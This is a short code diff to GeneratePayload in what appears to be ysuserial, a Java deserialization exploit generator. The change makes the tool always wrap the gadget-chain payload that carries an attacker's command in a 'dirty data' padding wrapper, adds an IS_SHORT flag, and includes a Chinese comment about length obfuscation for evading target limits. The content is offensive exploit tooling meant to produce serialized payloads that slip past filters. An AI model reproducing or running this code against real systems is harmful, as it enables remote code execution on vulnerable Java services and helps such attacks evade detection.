@@ -11,6 +11,8 @@ import org.su18.ysuserial.payloads.util.dirty.DirtyDataWrapper;
 
 public class GeneratePayload {
 
+	public static Boolean IS_SHORT = true;
+
 	private static final int INTERNAL_ERROR_CODE = 70;
 
 	private static final int USAGE_CODE = 64;
@@ -32,13 +34,16 @@ public class GeneratePayload {
 		}
 
 		try {
+			int length = 0;
+			// 如果加入长度混淆，证明目标对长度无限制，将 IS_SHORT 设置为 false
+			if (args.length >= 3) {
+				length = Integer.parseInt(args[2]);
+				IS_SHORT = false;
+			}
+
 			ObjectPayload payload = payloadClass.newInstance();
 			Object        object  = payload.getObject(command);
-
-			if (args.length >= 3) {
-				final String length = args[2];
-				object = (new DirtyDataWrapper(object, Integer.parseInt(length))).doWrap();
-			}
+			object = new DirtyDataWrapper(object, length).doWrap();
 
 			PrintStream out = System.out;
 			Serializer.serialize(object, out);
